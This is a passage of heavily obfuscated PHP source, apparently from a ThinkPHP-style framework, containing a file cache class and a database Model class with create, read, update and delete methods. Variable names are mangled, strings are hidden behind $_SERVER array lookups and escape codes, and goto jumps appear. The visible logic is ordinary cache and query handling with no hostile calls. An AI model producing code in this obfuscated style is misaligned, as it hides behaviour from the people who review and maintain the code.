$ùº¥»¾ó = self::get($Ù³ü÷Ö); if ($ùº¥»¾ó || $ùº¥»¾ó === $œõãá´–[12]) { return $ùº¥»¾ó; } $ùº¥»¾ó = call_user_func_array($÷¥‹™üÌ, $¹ËŸ¹‚ş); $ùº¥»¾ó = $ùº¥»¾ó ? $ùº¥»¾ó : $œõãá´–[12]; self::set($Ù³ü÷Ö, $ùº¥»¾ó, $ãåàÙÆ); return $ùº¥»¾ó; } public static function remove($Åğšô¤) { $ˆ©Ñ›¡´ = self::key($Åğšô¤); unset(self::$memoryCache[$ˆ©Ñ›¡´]); self::clearTimeout(); CacheLock::lock($Åğšô¤); $‹©¾ò¶ = self::init()->remove($ˆ©Ñ›¡´); CacheLock::unlock($Åğšô¤); return $‹©¾ò¶; } public static function removeMemory($Äó¡ºÔ) { $ºï‹í¢¸ = self::key($Äó¡ºÔ); unset(self::$memoryCache[$ºï‹í¢¸]); } public static function clearMemory($Íß¦Àåú = false) { if ($Íß¦Àåú) { $Íß¦Àåú = self::key($Íß¦Àåú); unset(self::$memoryCache[$Íß¦Àåú]); return; } self::$memoryCache = null; self::$memoryCache = array(); } public static function deleteAll() { self::$memoryCache = array(); if (method_exists(self::init(), $_SERVER[­õöî’–][823])) { self::init()->deleteAll(); } } public static function clearTimeout() { if (method_exists(self::init(), $_SERVER[­õöî’–][824])) { self::init()->clearTimeout(); } } } class CacheFile { public $cachePath; public $prefix; public $cacheTime; public function __construct($èÆÈ Şã, $â©éÉ„“) { $ìü§¿ı =& $_SERVER[­õöî’–]; $this->cachePath = $èÆÈ Şã[$ìü§¿ı[84]]; $this->prefix = $ìü§¿ı[825]; $this->cacheTime = $â©éÉ„“; if (!file_exists($this->cachePath)) { mkdir($this->cachePath, DEFAULT_PERRMISSIONS, !0); } } public function getFile($’‡Ò¾ˆ) { $•Ë³÷ÁÇ =& $_SERVER[­õöî’–]; $’‡Ò¾ˆ = str_replace(array($•Ë³÷ÁÇ[826], $•Ë³÷ÁÇ[97], $•Ë³÷ÁÇ[73]), $•Ë³÷ÁÇ[827], $’‡Ò¾ˆ); return $this->cachePath . $•Ë³÷ÁÇ[828] . $’‡Ò¾ˆ . $•Ë³÷ÁÇ[829]; } public function set($øÕÁ¥²ò, $…Àõï†Ë, $±é–èºó = false) { $±é–èºó = $±é–èºó ? $±é–èºó : $this->cacheTime; $…ÑÁ½„Ö = $this->getFile($øÕÁ¥²ò); if (file_put_contents($…ÑÁ½„Ö, $this->prefix . $…Àõï†Ë, LOCK_EX)) { @touch($…ÑÁ½„Ö, intval(time() + $±é–èºó)); clearstatcache(); return !0; } @unlink($…ÑÁ½„Ö); return !1; } public function get($ˆ’ë¾÷Œ) { $éå†í = $this->getFile($ˆ’ë¾÷Œ); if (file_exists($éå†í) && filemtime($éå†í) < time()) { @unlink($éå†í); return !1; } $­ò–ë¥¼ = @file_get_contents($éå†í); return substr($­ò–ë¥¼, strlen($this->prefix)); } public function remove($âı»†) { $¦Õß•À = $this->getFile($âı»†); return @unlink($¦Õß•À); } public function deleteAll() { $Á¸³æÈ® =& $_SERVER[­õöî’–]; $üªĞÖÜ™ = scandir($this->cachePath); foreach ($üªĞÖÜ™ as $È×‘Š) { $ÃÚ³¯ˆÄ = $this->cachePath . $È×‘Š; if (strpos($ÃÚ³¯ˆÄ, $Á¸³æÈ®[829]) && strpos($ÃÚ³¯ˆÄ, $Á¸³æÈ®[830])) { @unlink($ÃÚ³¯ˆÄ); } } } public function clearTimeout() { $Û¿è½¸ó =& $_SERVER[­õöî’–]; $’•¥•×Ó = scandir($this->cachePath); foreach ($’•¥•×Ó as $ù›ı³íœ) { $Éê’÷ú = $this->cachePath . $ù›ı³íœ; if (strpos($Éê’÷ú, $Û¿è½¸ó[829]) && strpos($Éê’÷ú, $Û¿è½¸ó[830]) && filemtime($Éê’÷ú) < time()) { @unlink($Éê’÷ú); } } } } goto cöŸñƒ‘±; Cåìñ¬Éš: class Model extends ClassBaseCall { private $_extModel = null; protected $db = null; protected $pk = "\x69\x64"; protected $tablePrefix = ''; protected $name = ''; protected $dbName = ''; protected $connection = ''; protected $tableName = ''; protected $trueTableName = ''; protected $error = ''; protected $fields = array(); protected $data = array(); protected $options = array(); protected $_validate = array(); protected $_auto = array(); protected $_map = array(); protected $_scope = array(); protected $autoCheckFields = true; protected $patchValidate = false; protected $methods = array("\x74\141\142\x6c\145", "\x6f\162\x64\145\162", "\141\154\x69\x61\x73", "\x68\141\x76\151\x6e\147", "\147\162\x6f\x75\160", "\154\157\x63\x6b", "\x64\151\163\x74\x69\x6e\143\164", "\x61\x75\164\x6f", "\x66\x69\154\164\x65\162", "\x76\141\x6c\151\x64\x61\x74\x65", "\x72\145\x73\x75\x6c\x74", "\x62\151\156\x64", "\x74\x6f\x6b\145\x6e"); public function __construct($¿âäèù = '', $¼÷ÉÆÏ = '', $ò‰°ßŞ¤ = '') { $ª£ñúŠ¾ =& $_SERVER[­õöî’–]; $this->_initialize(); if (!empty($¿âäèù)) { if (strpos($¿âäèù, $ª£ñúŠ¾[10])) { list($this->dbName, $this->name) = explode($ª£ñúŠ¾[10], $¿âäèù); } else { $this->name = $¿âäèù; } } elseif (empty($this->name)) { $this->name = $this->getModelName(); } if (is_null($¼÷ÉÆÏ)) { $this->tablePrefix = $ª£ñúŠ¾[12]; } elseif ($ª£ñúŠ¾[12] != $¼÷ÉÆÏ) { $this->tablePrefix = $¼÷ÉÆÏ; } else { $this->tablePrefix = $this->tablePrefix ? $this->tablePrefix : think_config($ª£ñúŠ¾[244]); } $this->db(0, empty($this->connection) ? $ò‰°ßŞ¤ : $this->connection); $this->_classObjectID = mt_rand(0, 10000); } protected function _checkTableInfo() { $˜‡‹ªà§ =& $_SERVER[­õöî’–]; if (empty($this->fields)) { if (think_config($˜‡‹ªà§[245])) { $„Ç¨Ëšˆ = $this->dbName ? $this->dbName : think_config($˜‡‹ªà§[246]); $ÆÉò›†Í = think_var_cache($˜‡‹ªà§[247] . strtolower(get_path_this($„Ç¨Ëšˆ) . $˜‡‹ªà§[10] . $this->name)); if ($ÆÉò›†Í) { $¾¤¶ŞÓı = think_config($˜‡‹ªà§[248]); if (empty($¾¤¶ŞÓı) || $ÆÉò›†Í[$˜‡‹ªà§[249]] == $¾¤¶ŞÓı) { $this->fields = $ÆÉò›†Í; return; } } } $this->flush(); } } public function flush() { $Á¡Ã±Â¹ =& $_SERVER[­õöî’–]; $this->db->setModel($this->name); $ºŸó‡ù = $this->db->getFields($this->getTableName()); if (!$ºŸó‡ù) { return !1; } $this->fields = array_keys($ºŸó‡ù); $this->fields[$Á¡Ã±Â¹[250]] = !1; foreach ($ºŸó‡ù as $€Öâ†Ò => $ÜïÉ…Å) { $Ë„¡¹[$€Öâ†Ò] = $ÜïÉ…Å[$Á¡Ã±Â¹[33]]; if ($ÜïÉ…Å[$Á¡Ã±Â¹[39]]) { $this->fields[$Á¡Ã±Â¹[251]] = $€Öâ†Ò; if ($ÜïÉ…Å[$Á¡Ã±Â¹[42]]) { $this->fields[$Á¡Ã±Â¹[250]] = !0; } } } $this->fields[$Á¡Ã±Â¹[252]] = $Ë„¡¹; if (think_config($Á¡Ã±Â¹[248])) { $this->fields[$Á¡Ã±Â¹[249]] = think_config($Á¡Ã±Â¹[248]); } if (think_config($Á¡Ã±Â¹[245])) { $¾®¢—À­ = $this->dbName ? $this->dbName : think_config($Á¡Ã±Â¹[246]); think_var_cache($Á¡Ã±Â¹[247] . strtolower(get_path_this($¾®¢—À­) . $Á¡Ã±Â¹[10] . $this->name), $this->fields); } } public function switchModel($á¢¸‰, $ï’™ñç• = array()) { $Àğø‰ƒ‰ =& $_SERVER[­õöî’–]; $èöîÓêà = ucwords(strtolower($á¢¸‰)) . $Àğø‰ƒ‰[253]; if (!class_exists($èöîÓêà)) { think_exception($èöîÓêà . think_lang($Àğø‰ƒ‰[254])); } $this->_extModel = new $èöîÓêà($this->name); if (!empty($ï’™ñç•)) { foreach ($ï’™ñç• as $àÆãˆ“à) { $this->_extModel->setProperty($àÆãˆ“à, $this->{$àÆãˆ“à}); } } return $this->_extModel; } public function __set($µÀÏ•Š, $«Õ—¦¥Å) { $this->data[$µÀÏ•Š] = $«Õ—¦¥Å; } public function __get($êø…Ù’•) { return isset($this->data[$êø…Ù’•]) ? $this->data[$êø…Ù’•] : null; } public function __isset($Ò¾ë‘ºç) { return isset($this->data[$Ò¾ë‘ºç]); } public function __unset($›¸ú·¤ø) { unset($this->data[$›¸ú·¤ø]); } public function __call($ûÌùÙãÒ, $Ÿå‹úâ») { $øÛ° Ï =& $_SERVER[­õöî’–]; if (in_array(strtolower($ûÌùÙãÒ), $this->methods, !0)) { $this->options[strtolower($ûÌùÙãÒ)] = $Ÿå‹úâ»[0]; return $this; } elseif (in_array(strtolower($ûÌùÙãÒ), array($øÛ° Ï[255], $øÛ° Ï[256], $øÛ° Ï[257], $øÛ° Ï[258], $øÛ° Ï[259]), !0)) { $½ªÑÀÃ¿ = isset($Ÿå‹úâ»[0]) ? $Ÿå‹úâ»[0] : $øÛ° Ï[188]; $½ªÑÀÃ¿ = $this->db->parseKey($½ªÑÀÃ¿); return $this->getField(strtoupper($ûÌùÙãÒ) . $øÛ° Ï[260] . $½ªÑÀÃ¿ . $øÛ° Ï[261] . $ûÌùÙãÒ, $øÛ° Ï[255]); } elseif (strtolower(substr($ûÌùÙãÒ, 0, 5)) == $øÛ° Ï[262]) { $½ªÑÀÃ¿ = think_parse_name(substr($ûÌùÙãÒ, 5)); $Õ¹Ÿèüİ[$½ªÑÀÃ¿] = $Ÿå‹úâ»[0]; return $this->where($Õ¹Ÿèüİ)->find(); } elseif (strtolower(substr($ûÌùÙãÒ, 0, 10)) == $øÛ° Ï[263]) { $Üë–üº­ = think_parse_name(substr($ûÌùÙãÒ, 10)); $Õ¹Ÿèüİ[$Üë–üº­] = $Ÿå‹úâ»[0]; return $this->where($Õ¹Ÿèüİ)->getField($Ÿå‹úâ»[1]); } elseif (isset($this->_scope[$ûÌùÙãÒ])) { return $this->scope($ûÌùÙãÒ, $Ÿå‹úâ»[0]); } elseif (method_exists($this, $ûÌùÙãÒ)) { array_unshift($Ÿå‹úâ», $ûÌùÙãÒ); return call_user_func_array(array($this, $øÛ° Ï[264]), $Ÿå‹úâ»); } else { return call_user_func_array(array(parent, $ûÌùÙãÒ), $Ÿå‹úâ»); } } protected function call() { $Ş’ˆµÔß =& $_SERVER[­õöî’–]; $ÛÇÓşÌ = func_get_args(); $°‘†é  = array_shift($ÛÇÓşÌ); $õÃ„Öì = $°‘†é ; if (is_array($°‘†é )) { $õÃ„Öì = $°‘†é [1]; $°‘†é  = $°‘†é [0]; } $âµµÇ¶ó = count($ÛÇÓşÌ) - 1; if (isset($ÛÇÓşÌ[$âµµÇ¶ó]) && $ÛÇÓşÌ[$âµµÇ¶ó] === $°‘†é ) { think_exception(__CLASS__ . $Ş’ˆµÔß[4] . $°‘†é  . think_lang($Ş’ˆµÔß[265])); return; } $ÛÇÓşÌ[] = $°‘†é ; if (method_exists($this, $Ş’ˆµÔß[266])) { $öáÑ¦½ü = call_user_func_array(array($this, $Ş’ˆµÔß[267]), array($õÃ„Öì, $ÛÇÓşÌ)); if (!is_null($öáÑ¦½ü) && $öáÑ¦½ü !== !1) { return $öáÑ¦½ü; } } $»²è¸¹ã = call_user_func_array(array($this, $°‘†é ), $ÛÇÓşÌ); if (method_exists($this, $Ş’ˆµÔß[268])) { $öáÑ¦½ü = call_user_func_array(array($this, $Ş’ˆµÔß[269]), array($õÃ„Öì, $ÛÇÓşÌ, $»²è¸¹ã)); if ($öáÑ¦½ü) { return $öáÑ¦½ü; } } return $»²è¸¹ã; } protected function _initialize() { } protected function _facade($Õëíõ³ ) { $÷óæé€¸ =& $_SERVER[­õöî’–]; if (!empty($this->fields)) { foreach ($Õëíõ³  as $×›İ§ÃÚ => $µÇÔ‡ÓÅ) { if (is_array($this->fields) && !in_array($×›İ§ÃÚ, $this->fields, !0)) { unset($Õëíõ³ [$×›İ§ÃÚ]); } elseif (is_scalar($µÇÔ‡ÓÅ)) { $this->_parseType($Õëíõ³ , $×›İ§ÃÚ); } } } if (!empty($this->options[$÷óæé€¸[270]])) { $Õëíõ³  = array_map($this->options[$÷óæé€¸[270]], $Õëíõ³ ); unset($this->options[$÷óæé€¸[270]]); } $this->_beforeWrite($Õëíõ³ ); return $Õëíõ³ ; } protected function _beforeWrite(&$©ç¸ÑÕÒ) { } public function add($ÆÆ“Öö® = '', $Ûë÷®Ñ = array(), $’“˜é¼À = false) { if (empty($ÆÆ“Öö®)) { if (!empty($this->data)) { $ÆÆ“Öö® = $this->data; $this->data = array(); } else { $this->error = think_lang($_SERVER[­õöî’–][271]); return !1; } } $Ûë÷®Ñ = $this->_parseOptions($Ûë÷®Ñ); $ÆÆ“Öö® = $this->_facade($ÆÆ“Öö®); if (!1 === $this->_beforeInsert($ÆÆ“Öö®, $Ûë÷®Ñ)) { return !1; } $èâ‰±‘Ü = $this->db->insert($ÆÆ“Öö®, $Ûë÷®Ñ, $’“˜é¼À); if (!1 !== $èâ‰±‘Ü) { $¼ş™¼øÜ = $this->getLastInsID(); if ($¼ş™¼øÜ) { $ÆÆ“Öö®[$this->getPk()] = $¼ş™¼øÜ; $this->_after_insert($ÆÆ“Öö®, $Ûë÷®Ñ); return $¼ş™¼øÜ; } $this->_after_insert($ÆÆ“Öö®, $Ûë÷®Ñ); } return $èâ‰±‘Ü; } protected function _beforeInsert(&$èÕ¢æ‰Å, $ºÕÎÆÒ) { } protected function _after_insert($‘ê¬©§«, $ëˆìÛäª) { } public function addAll($œ—¤ºŸà, $¹„Š‰‰á = array(), $‡‹ĞÏ®İ = false) { $Òóå•›Ò =& $_SERVER[­õöî’–]; if (empty($œ—¤ºŸà)) { $this->error = think_lang($Òóå•›Ò[271]); return !1; } $¹„Š‰‰á = $this->_parseOptions($¹„Š‰‰á); foreach ($œ—¤ºŸà as $˜‘ƒŞü¹ => $ó™Àùñé) { $œ—¤ºŸà[$˜‘ƒŞü¹] = $this->_facade($ó™Àùñé); } if (method_exists($this->db, $Òóå•›Ò[272])) { $ì÷§ùã— = $this->db->insertAll($œ—¤ºŸà, $¹„Š‰‰á, $‡‹ĞÏ®İ); } else { $this->startTrans(); foreach ($œ—¤ºŸà as $˜‘ƒŞü¹ => $ó™Àùñé) { $ì÷§ùã— = $this->db->insert($ó™Àùñé, $¹„Š‰‰á, $‡‹ĞÏ®İ); } $this->commit(); } if (!1 !== $ì÷§ùã—) { $ßê•ÌË‚ = $this->getLastInsID(); if ($ßê•ÌË‚) { return $ßê•ÌË‚; } } return $ì÷§ùã—; } public function selectAdd($•™´†ê‰ = '', $¸°ù¯‰Ê = '', $•«²İâ¹ = array()) { $ªïÎí¼ =& $_SERVER[­õöî’–]; $•«²İâ¹ = $this->_parseOptions($•«²İâ¹); if (!1 === ($ôæŞ·‰ª = $this->db->selectInsert($•™´†ê‰ ? $•™´†ê‰ : $•«²İâ¹[$ªïÎí¼[273]], $¸°ù¯‰Ê ? $¸°ù¯‰Ê : $this->getTableName(), $•«²İâ¹))) { $this->error = think_lang($ªïÎí¼[274]); return !1; } else { return $ôæŞ·‰ª; } } public function save($Ù€èÁÈŠ = '', $†·…©±§ = array()) { $ŸŒĞÍëæ =& $_SERVER[­õöî’–]; if (empty($Ù€èÁÈŠ)) { if (!empty($this->data)) { $Ù€èÁÈŠ = $this->data; $this->data = array(); } else { $this->error = think_lang($ŸŒĞÍëæ[271]); return !1; } } $Ù€èÁÈŠ = $this->_facade($Ù€èÁÈŠ); $†·…©±§ = $this->_parseOptions($†·…©±§); $äñæÉ„ù = $this->getPk(); if (!isset($†·…©±§[$ŸŒĞÍëæ[275]])) { if (isset($Ù€èÁÈŠ[$äñæÉ„ù])) { $¥Šäş‡›[$äñæÉ„ù] = $Ù€èÁÈŠ[$äñæÉ„ù]; $†·…©±§[$ŸŒĞÍëæ[275]] = $¥Šäş‡›; unset($Ù€èÁÈŠ[$äñæÉ„ù]); } else { $this->error = think_lang($ŸŒĞÍëæ[274]); return !1; } } if (is_array($†·…©±§[$ŸŒĞÍëæ[275]]) && isset($†·…©±§[$ŸŒĞÍëæ[275]][$äñæÉ„ù])) { $©ˆœ×è– = $†·…©±§[$ŸŒĞÍëæ[275]][$äñæÉ„ù]; } if (!1 === $this->_beforeUpdate($Ù€èÁÈŠ, $†·…©±§)) { return !1; } $—Ÿõ—Î¼ = $this->db->update($Ù€èÁÈŠ, $†·…©±§); if (!1 !== $—Ÿõ—Î¼) { if (isset($©ˆœ×è–)) { $Ù€èÁÈŠ[$äñæÉ„ù] = $©ˆœ×è–; } $this->_afterUpdate($Ù€èÁÈŠ, $†·…©±§); } return $—Ÿõ—Î¼; } protected function _beforeUpdate(&$œÚ¼ôö, $ÖôÊĞÜĞ) { } protected function _afterUpdate($¶Å©ê¬ü, $Œúûšëè) { } public function delete($ìüš»€ã = array()) { $Ø•ÖªÌ• =& $_SERVER[­õöî’–]; if (empty($ìüš»€ã) && empty($this->options[$Ø•ÖªÌ•[275]])) { if (!empty($this->data) && isset($this->data[$this->getPk()])) { return $this->delete($this->data[$this->getPk()]); } else { return !1; } } $¯Ï£Äú´ = $this->getPk(); if (is_numeric($ìüš»€ã) || is_string($ìüš»€ã)) { if (strpos($ìüš»€ã, $Ø•ÖªÌ•[50])) { $™ä‹í«”[$¯Ï£Äú´] = array($Ø•ÖªÌ•[276], $ìüš»€ã); } else { $™ä‹í«”[$¯Ï£Äú´] = $ìüš»€ã; } $this->options[$Ø•ÖªÌ•[275]] = $™ä‹í«”; } $ìüš»€ã = $this->_parseOptions(); if (is_array($ìüš»€ã[$Ø•ÖªÌ•[275]]) && isset($ìüš»€ã[$Ø•ÖªÌ•[275]][$¯Ï£Äú´])) { $öàêÍ“¤ = $ìüš»€ã[$Ø•ÖªÌ•[275]][$¯Ï£Äú´]; } $Í”Ø†î = $this->db->delete($ìüš»€ã); if (!1 !== $Í”Ø†î) { $ÉÕñ  = array(); if (isset($öàêÍ“¤)) { $ÉÕñ [$¯Ï£Äú´] = $öàêÍ“¤; } $this->_after_delete($ÉÕñ , $ìüš»€ã); } return $Í”Ø†î; } protected function _after_delete($Øç»«´, $ÏÜª¸²µ) { } public function select($Ú ¿ë´ = array()) { $Å¹ÔÌú± =& $_SERVER[­õöî’–]; if (is_string($Ú ¿ë´) || is_numeric($Ú ¿ë´)) { $½¢—–†à = $this->getPk(); if (strpos($Ú ¿ë´, $Å¹ÔÌú±[50])) { $ÇÜ‘úó[$½¢—–†à] = array($Å¹ÔÌú±[276], $Ú ¿ë´); } else { $ÇÜ‘úó[$½¢—–†à] = $Ú ¿ë´; } $this->options[$Å¹ÔÌú±[275]] = $ÇÜ‘úó; } elseif (!1 === $Ú ¿ë´) { $Ú ¿ë´ = $this->_parseOptions(); return $Å¹ÔÌú±[277] . $this->db->buildSelectSql($Ú ¿ë´) . $Å¹ÔÌú±[278]; } $Ú ¿ë´ = $this->_parseOptions(); $ı†şı¼ = $this->db->select($Ú ¿ë´); if (!1 === $ı†şı¼) { return !1; } if (empty($ı†şı¼)) { return null; } $this->_afterSelect($ı†şı¼, $Ú ¿ë´); return $ı†şı¼; } protected function _afterSelect(&$ë°º®“÷, $¸»ñÚ¹›) { } public function buildSql($ŠŠÈ¦í = array()) { $íëŸ¨¨­ =& $_SERVER[­õöî’–]; $ŠŠÈ¦í = $this->_parseOptions($ŠŠÈ¦í); return $íëŸ¨¨­[277] . $this->db->buildSelectSql($ŠŠÈ¦í) . $íëŸ¨¨­[278]; } public function optionsValue($±ÈŠÂ‰Ã = null) { if (is_null($±ÈŠÂ‰Ã)) { return $this->options; } elseif (is_array($±ÈŠÂ‰Ã)) { $this->options = array_merge($this->options, $±ÈŠÂ‰Ã); } } protected function _parseOptions($¢³ø”Ùğ = array()) { $Ğ©‹ãöå =& $_SERVER[­õöî’–]; if (is_array($¢³ø”Ùğ)) { $¢³ø”Ùğ = array_merge($this->options, $¢³ø”Ùğ); } $this->options = array(); if (!isset($¢³ø”Ùğ[$Ğ©‹ãöå[279]])) { $¢³ø”Ùğ[$Ğ©‹ãöå[279]] = $this->getTableName(); $Ñª„ûÉˆ = $this->fields; } else { $Ñª„ûÉˆ = $this->getDbFields(); } if (!empty($¢³ø”Ùğ[$Ğ©‹ãöå[280]])) { $¢³ø”Ùğ[$Ğ©‹ãöå[279]] .= $Ğ©‹ãöå[53] . $¢³ø”Ùğ[$Ğ©‹ãöå[280]]; } $¢³ø”Ùğ[$Ğ©‹ãöå[281]] = $this->name; if (isset($¢³ø”Ùğ[$Ğ©‹ãöå[275]]) && is_array($¢³ø”Ùğ[$Ğ©‹ãöå[275]]) && !empty($Ñª„ûÉˆ) && !isset($¢³ø”Ùğ[$Ğ©‹ãöå[282]]) && !isset($¢³ø”Ùğ[$Ğ©‹ãöå[279]])) { foreach ($¢³ø”Ùğ[$Ğ©‹ãöå[275]] as $ô­¡¨©É => $™¨†ğÚÔ) { $ô­¡¨©É = trim($ô­¡¨©É); if (in_array($ô­¡¨©É, $Ñª„ûÉˆ, !0)) { if (is_scalar($™¨†ğÚÔ)) { $this->_parseType($¢³ø”Ùğ[$Ğ©‹ãöå[275]], $ô­¡¨©É); } } elseif (!is_numeric($ô­¡¨©É) && $Ğ©‹ãöå[11] != substr($ô­¡¨©É, 0, 1) && !1 === strpos($ô­¡¨©É, $Ğ©‹ãöå[10]) && !1 === strpos($ô­¡¨©É, $Ğ©‹ãöå[260]) && !1 === strpos($ô­¡¨©É, $Ğ©‹ãöå[283]) && !1 === strpos($ô­¡¨©É, $Ğ©‹ãöå[284])) { unset($¢³ø”Ùğ[$Ğ©‹ãöå[275]][$ô­¡¨©É]); } } } $this->_options_filter($¢³ø”Ùğ); return $¢³ø”Ùğ; } protected function _options_filter(&$‹×Í™‘) { } protected function _parseType(&$‘‡Ñ«úÁ, $·¹¿‰Ø—) { $“Ş•›Ó =& $_SERVER[­õöî’–]; if (empty($this->options[$“Ş•›Ó[285]][$“Ş•›Ó[4] . $·¹¿‰Ø—])) { $„•™Ä£î = strtolower($this->fields[$“Ş•›Ó[252]][$·¹¿‰Ø—]); if (!1 !== strpos($„•™Ä£î, $“Ş•›Ó[286])) { } elseif (!1 === strpos($„•™Ä£î, $“Ş•›Ó[287]) && !1 !== strpos($„•™Ä£î, $“Ş•›Ó[288])) { $‘‡Ñ«úÁ[$·¹¿‰Ø—] = intval($‘‡Ñ«úÁ[$·¹¿‰Ø—]); } elseif (!1 !== strpos($„•™Ä£î, $“Ş•›Ó[289]) || !1 !== strpos($„•™Ä£î, $“Ş•›Ó[290])) { $‘‡Ñ«úÁ[$·¹¿‰Ø—] = floatval($‘‡Ñ«úÁ[$·¹¿‰Ø—]); } elseif (!1 !== strpos($„•™Ä£î, $“Ş•›Ó[291])) { $‘‡Ñ«úÁ[$·¹¿‰Ø—] = (bool) $‘‡Ñ«úÁ[$·¹¿‰Ø—]; } } } public function find($Œ¨¡·ö× = array()) { $‹¥¿üú =& $_SERVER[­õöî’–]; if (is_numeric($Œ¨¡·ö×) || is_string($Œ¨¡·ö×)) { $âÙ©˜û[$this->getPk()] = intval($Œ¨¡·ö×); $this->options[$‹¥¿üú[275]] = $âÙ©˜û; } $this->options[$‹¥¿üú[292]] = 1; $Œ¨¡·ö× = $this->_parseOptions(); $½§Œ«† = $this->db->select($Œ¨¡·ö×); if (!1 === $½§Œ«†) { return !1; } if (empty($½§Œ«†)) { return null; } $this->data = $½§Œ«†[0]; $this->_afterFind($this->data, $Œ¨¡·ö×); if (!empty($this->options[$‹¥¿üú[293]])) { return $this->returnResult($this->data, $this->options[$‹¥¿üú[293]]); } return $this->data; } protected function _afterFind(&$ñŒûÊşá, $›€ƒ¦¤È) { } protected function returnResult($à´‰¦÷Æ, $Ù›¤É„Ì = '') { $äúú™® =& $_SERVER[­õöî’–]; if ($Ù›¤É„Ì) { if (is_callable($Ù›¤É„Ì)) { return call_user_func($Ù›¤É„Ì, $à´‰¦÷Æ); } switch (strtolower($Ù›¤É„Ì)) { case $äúú™®[294]: return json_encode($à´‰¦÷Æ); case $äúú™®[295]: return xml_encode($à´‰¦÷Æ); } } return $à´‰¦÷Æ; } public function parseFieldsMap($’”Ì™İä, $ù–ƒ­ñË = 1) { if (!empty($this->_map)) { foreach ($this->_map as $¡¨®¹ù => $¿†Œê÷ï) { if ($ù–ƒ­ñË == 1) { if (isset($’”Ì™İä[$¿†Œê÷ï])) { $’”Ì™İä[$¡¨®¹ù] = $’”Ì™İä[$¿†Œê÷ï]; unset($’”Ì™İä[$¿†Œê÷ï]); } } else { if (isset($’”Ì™İä[$¡¨®¹ù])) { $’”Ì™İä[$¿†Œê÷ï] = $’”Ì™İä[$¡¨®¹ù]; unset($’”Ì™İä[$¡¨®¹ù]); } } } } return $’”Ì™İä; } public function setField($Èøı¾¢, $ƒ÷ÉÉ²” = '') { if (is_array($Èøı¾¢)) { $»‘Ñ®Œ = $Èøı¾¢; } else { $»‘Ñ®Œ[$Èøı¾¢] = $ƒ÷ÉÉ²”; } return $this->save($»‘Ñ®Œ); } public function setAdd($¸óÕã, $¦¸Èä¹ = 1) { $É–Û‡ì‰ =& $_SERVER[­õöî’–]; $”ï æèê = $¸óÕã . $É–Û‡ì‰[296] . $¦¸Èä¹; if ($¦¸Èä¹ < 0) { $”ï æèê = $¸óÕã . $¦¸Èä¹; } return $this->setField($¸óÕã, array($É–Û‡ì‰[297], $”ï æèê)); } public function getField($ÆÍ©âğş, $Æ×²Ö¦‹ = null) { $²æ‰Êù =& $_SERVER[­õöî’–]; $¶»½Óâ‹[$²æ‰Êù[273]] = $ÆÍ©âğş; $¶»½Óâ‹ = $this->_parseOptions($¶»½Óâ‹); $ÆÍ©âğş = trim($ÆÍ©âğş); if (strpos($ÆÍ©âğş, $²æ‰Êù[50])) { if (!isset($¶»½Óâ‹[$²æ‰Êù[292]])) { $¶»½Óâ‹[$²æ‰Êù[292]] = is_numeric($Æ×²Ö¦‹) ? $Æ×²Ö¦‹ : $²æ‰Êù[12]; } $éÛ‚“íê = $this->db->select($¶»½Óâ‹); if (!empty($éÛ‚“íê)) { $™è›Òß× = explode($²æ‰Êù[50], $ÆÍ©âğş); $ÆÍ©âğş = array_keys($éÛ‚“íê[0]); $Ëä€ÃÁ = array_shift($ÆÍ©âğş); $ò­Ø£•Ÿ = array_shift($ÆÍ©âğş); $À…œšó„ = array(); $¬ÆËÜ‹ê = count($™è›Òß×); foreach ($éÛ‚“íê as $•ŠÌÂô) { $ÁŸú¸à× = $•ŠÌÂô[$Ëä€ÃÁ]; if (2 == $¬ÆËÜ‹ê) { $À…œšó„[$ÁŸú¸à×] = $•ŠÌÂô[$ò­Ø£•Ÿ]; } else { $À…œšó„[$ÁŸú¸à×] = is_string($Æ×²Ö¦‹) ? implode($Æ×²Ö¦‹, $•ŠÌÂô) : $•ŠÌÂô; } } return $À…œšó„; } } else { if (!0 !== $Æ×²Ö¦‹) { $¶»½Óâ‹[$²æ‰Êù[292]] = is_numeric($Æ×²Ö¦‹) ? $Æ×²Ö¦‹ : 1; } if ($Æ×²Ö¦‹ === $²æ‰Êù[255]) { unset($¶»½Óâ‹[$²æ‰Êù[292]]); } $•ŠÌÂô = $this->db->select($¶»½Óâ‹); if (!empty($•ŠÌÂô)) { if ($Æ×²Ö¦‹ === $²æ‰Êù[255]) { return reset($•ŠÌÂô[0]); } if (!0 !== $Æ×²Ö¦‹ && 1 == $¶»½Óâ‹[$²æ‰Êù[292]]) { return reset($•ŠÌÂô[0]); } foreach ($•ŠÌÂô as $Ëœ…™åğ) { $†¥èÊ÷À[] = $Ëœ…™åğ[$ÆÍ©âğş]; } return $†¥èÊ÷À; } } return null; } public function create($ÁŒ‡Ù¹İ = '', $ğéÕÜÉ‹ = '') { $Â”ƒ±ı… =& $_SERVER[­õöî’–]; if (empty($ÁŒ‡Ù¹İ)) { $ÁŒ‡Ù¹İ = $_POST; } elseif (is_object($ÁŒ‡Ù¹İ)) { $ÁŒ‡Ù¹İ = get_object_vars($ÁŒ‡Ù¹İ); } if (empty($ÁŒ‡Ù¹İ) || !is_array($ÁŒ‡Ù¹İ)) { $this->error = think_lang($Â”ƒ±ı…[271]); return !1; } $ÁŒ‡Ù¹İ = $this->parseFieldsMap($ÁŒ‡Ù¹İ, 0); $ğéÕÜÉ‹ = $ğéÕÜÉ‹ ? $ğéÕÜÉ‹ : (!empty($ÁŒ‡Ù¹İ[$this->getPk()]) ? THINK_MODEL_UPDATE : THINK_MODEL_INSERT); if (isset($this->options[$Â”ƒ±ı…[273]])) { $ĞÚ¡ĞÏ« = $this->options[$Â”ƒ±ı…[273]]; unset($this->options[$Â”ƒ±ı…[273]]); } elseif ($ğéÕÜÉ‹ == THINK_MODEL_INSERT && isset($this->insertFields)) { $ĞÚ¡ĞÏ« = $this->insertFields; } elseif ($ğéÕÜÉ‹ == THINK_MODEL_UPDATE && isset($this->updateFields)) { $ĞÚ¡ĞÏ« = $this->updateFields; } if (isset($ĞÚ¡ĞÏ«)) { if (is_string($ĞÚ¡ĞÏ«)) { $ĞÚ¡ĞÏ« = explode($Â”ƒ±ı…[50], $ĞÚ¡ĞÏ«); } if (think_config($Â”ƒ±ı…[298])) { $ĞÚ¡ĞÏ«[] = think_config($Â”ƒ±ı…[299]); } foreach ($ÁŒ‡Ù¹İ as $ñ¦ô— => $ôãâ «ó) { if (!in_array($ñ¦ô—, $ĞÚ¡ĞÏ«)) { unset($ÁŒ‡Ù¹İ[$ñ¦ô—]); } } } if (!$this->autoValidation($ÁŒ‡Ù¹İ, $ğéÕÜÉ‹)) { return !1; } if 